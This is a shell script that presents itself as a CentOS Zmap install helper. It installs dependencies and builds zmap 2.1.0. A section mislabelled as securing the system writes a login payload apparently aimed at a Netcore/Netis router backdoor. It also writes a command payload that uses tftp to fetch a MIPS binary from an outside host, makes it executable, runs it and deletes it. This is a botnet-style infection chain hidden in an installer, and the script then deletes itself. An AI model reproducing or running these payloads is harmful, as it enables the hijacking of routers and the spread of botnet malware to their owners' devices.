#!/bin/sh
# CentOS Zmap & SSH2 Fix Install
#Modified by AntiBots

#/////////////////////////////////////////////////////////////
#Installing Depos
clear
sleep 2s
echo -e "\e[1;96m[\e[1;92m+\e[1;96m] \e[1;92mInstalling Depos \e[1;96m& \e[1;92mZmap \e[1;96m...\e[0m"
sleep 2s
yum update -y
yum install gcc cmake gmp gmp-devel libpcap-devel gengetopt byacc flex -y
yum install json-c-doc.noarch json-c.i686 json-c.x86_64 json-c-devel.i686 json-c-devel.x86_64 -y
yum install epel-release -y
yum install gengetopt -y
#/////////////////////////////////////////////////////////////


#/////////////////////////////////////////////////////////////
# Installing zmap via github & taring
clear
echo -e "\e[1;96m[\e[1;92m+\e[1;96m] \e[1;92mInstalling Zmap\e[1;96m...\e[0m"
sleep 2s
wget https://github.com/zmap/zmap/archive/v2.1.0.tar.gz
tar -xvf v2.1.0.tar.gz
cd zmap-2.1.0
flex -o "src/lexer.c" --header-file="src/lexer.h" "src/lexer.l"
byacc -d -o "src/parser.c" "src/parser.y"
mkdir /etc/zmap
cp conf/* /etc/zmap
cmake -DENABLE_HARDENING=ON
make
make install
#/////////////////////////////////////////////////////////////


#/////////////////////////////////////////////////////////////
# Lets Secure Some Shit! | Some user input needed!
python -c "print 'A'*8 + 'netcore\x00'" > loginpayload
python -c "print 'AA\x00\x00AAAA cd /var/; tftp -g -r mipselss 1.1.1.1; chmod 777 mipsel; ./mipsel; rm -rf mipsel\x00'" > commandpayload
#/////////////////////////////////////////////////////////////


#/////////////////////////////////////////////////////////////
# Finishing Up | Cleaning Up
echo -e "\e[1;96m[\e[1;92m+\e[1;96m] \e[1;92mYour Zmap Was Installed! | -AntiBots\e[0m"
sleep 2s
clear
rm -rf zmap.sh
#/////////////////////////////////////////////////////////////